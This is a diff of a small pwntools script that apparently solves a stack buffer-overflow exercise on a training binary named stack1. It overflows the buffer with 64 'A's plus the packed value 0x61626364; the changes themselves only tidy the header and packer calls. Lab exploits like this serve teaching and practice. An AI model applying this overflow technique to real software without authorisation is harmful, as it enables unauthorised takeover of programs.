@@ -1,13 +1,13 @@
 #!/usr/bin/env python2
-# -*- coding: utf-8 -*-python
+# -*- coding: utf-8 -*-
 
 from pwn import *
 import os
 import sys
 
 context(arch='i386', os='linux')
-pack = make_packer(32, endian='little', sign='unsigned')
-unpack = make_unpacker(32, endian='little', sign='unsigned')
+pack = make_packer()
+unpack = make_unpacker()
 
 io = process(['../bin/stack1', 'A' * 64 + pack(0x61626364)])
 
